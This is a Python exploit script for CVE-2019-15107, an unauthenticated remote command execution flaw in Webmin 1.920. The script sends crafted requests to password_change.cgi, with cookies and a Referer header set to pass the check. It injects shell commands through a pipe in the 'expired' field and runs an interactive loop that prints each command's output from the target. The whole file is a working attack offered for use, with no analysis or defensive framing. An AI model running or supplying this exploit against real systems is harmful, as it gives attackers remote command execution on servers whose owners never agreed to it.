import requests
import argparse
import re

class Webmin():
    def __init__(self,target):
        self.target = target
        self.url = self.url_fix()
        self.exploit()
        

    def url_fix(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution")
        print("Getting shell on target " + self.url)

        pass_change_url = self.url + "password_change.cgi"
        referer_url = self.url + "session_login.cgi"

        exploit_headers = {
            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1;",
            "Referer": referer_url
        }

        while True:
            cmd = input("RCE: ")
            post_data = {
                "user":"bababooey",
                "pam":"",
                "expired":"2 | echo '';" + cmd 
            }

            req_site = requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False)
            search = re.compile(r"chosen.\s+(.*?)</p>",re.DOTALL) 
            cmd_text = search.search(req_site.text).group(1)
            print(cmd_text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://webmin.site/', required=True)
    args = parser.parse_args()
    
    try:
        Webmin(args.t)
    except KeyboardInterrupt:
        print("Bye Bye!")
        exit()